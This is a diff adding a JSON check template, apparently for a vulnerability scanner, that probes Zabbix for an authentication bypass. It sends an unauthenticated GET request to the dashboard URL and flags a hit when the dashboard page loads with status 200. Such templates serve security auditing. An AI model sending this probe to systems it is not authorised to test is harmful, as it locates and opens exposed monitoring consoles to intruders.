@@ -1,0 +1,36 @@
+{
+    "Name": "zabbix-authentication-bypass",
+    "Description": "zabbix-authentication-bypass",
+    "Product": "zabbix",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/zabbix.php?action=dashboard.view&dashboardid=1",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "<a class=\"top-nav-zbbshare\" target=\"_blank\" title=\"Zabbix Share\" href=\"https://share.zabbix.com/\">Share</a>"
+                }, {
+                    "Operation": "contains", 
+                    "Key":"",
+                    "Value": "<title>Dashboard</title>"
+                    },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
